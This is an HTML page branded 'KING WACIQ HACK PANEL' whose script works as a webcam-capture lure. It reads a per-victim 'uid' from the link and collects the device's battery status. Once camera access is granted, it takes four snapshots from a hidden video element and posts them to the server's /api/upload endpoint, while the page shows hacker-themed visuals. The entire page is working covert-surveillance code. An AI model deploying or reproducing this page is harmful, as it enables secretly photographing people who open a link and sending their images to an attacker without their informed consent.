<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>KING WACIQ HACK PANEL</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: #000;
      color: #00ff00;
      font-family: 'Orbitron', monospace;
      overflow: hidden;
      text-align: center;
    }
    canvas#matrix {
      position: fixed;
      top: 0;
      left: 0;
      z-index: 0;
    }
    .overlay {
      position: relative;
      z-index: 2;
      text-align: center;
      padding-top: 40px;
    }
    h1 {
      font-size: 3em;
      animation: glow 2s infinite alternate;
    }
    h2 {
      font-size: 2em;
      margin-bottom: 20px;
      animation: pulse 2s infinite;
    }
    p, .log {
      font-size: 16px;
      color: #66ff66;
    }
    video, canvas#snapshot {
      display: none;
    }
    @keyframes glow {
      from { text-shadow: 0 0 5px #00ff00; }
      to { text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00; }
    }
    @keyframes pulse {
      0% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.1); opacity: 0.7; }
      100% { transform: scale(1); opacity: 1; }
    }
  </style>
</head>
<body>
  <!-- Matrix Rain Background -->
  <canvas id="matrix"></canvas>

  <div class="overlay">
    <h1>KING WACIQ</h1>
    <h2>HACK PANEL</h2>
    <p id="status">Connecting...</p>
    <div class="log" id="log"></div>
  </div>

  <!-- Hidden Elements -->
  <video id="video" autoplay playsinline></video>
  <canvas id="snapshot"></canvas>

  <script>
  const video = document.getElementById('video');
  const canvas = document.getElementById('snapshot');
  const ctx = canvas.getContext('2d');
  const log = document.getElementById('log');
  const statusEl = document.getElementById('status');

  const params = new URLSearchParams(window.location.search);
  const uid = params.get('uid') || 'unknown';

  let snapshotsTaken = 0;
  const maxSnapshots = 4;

  function takeSnapshotAndSend(battery, charging) {
    if (snapshotsTaken >= maxSnapshots) return;

    if (video.videoWidth === 0 || video.videoHeight === 0) {
      console.warn("⚠️ Video not ready, retrying in 300ms...");
      setTimeout(() => takeSnapshotAndSend(battery, charging), 300);
      return;
    }

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imageData = canvas.toDataURL('image/png');

    fetch('/api/upload', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        image: imageData,
        uid,
        battery,
        charging
      })
    }).then(res => res.json()).then(data => {
      snapshotsTaken++;
      console.log("✅ Uploaded:", snapshotsTaken, data);
      log.innerText += `Snapshot ${snapshotsTaken} uploaded...\n`;

      if (snapshotsTaken === maxSnapshots) {
        console.log("📴 Max snapshots reached, stopping camera.");
        video.srcObject.getTracks().forEach(track => track.stop());
      }
    }).catch(err => {
      console.error("❌ Upload error:", err);
      log.innerText += "Upload failed!\n";
    });
  }

  if (uid) {
    navigator.getBattery().then(battery => {
      const batteryLevel = Math.round(battery.level * 100);
      const isCharging = battery.charging;

      log.innerText += `Battery: ${batteryLevel}% | Charging: ${isCharging}\n`;

      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
        video.srcObject = stream;
        statusEl.innerText = "Camera access granted...";

        // 📸 Start snapshots when metadata (dimensions) is ready
        video.onloadedmetadata = () => {
          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 2000);
          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 4000);
          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 6000);
          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 8000);
        };
      }).catch(err => {
        console.error("Camera error:", err);
        statusEl.innerText = "Camera error!";
      });
    });
  }
</script> 
</body>
</html>
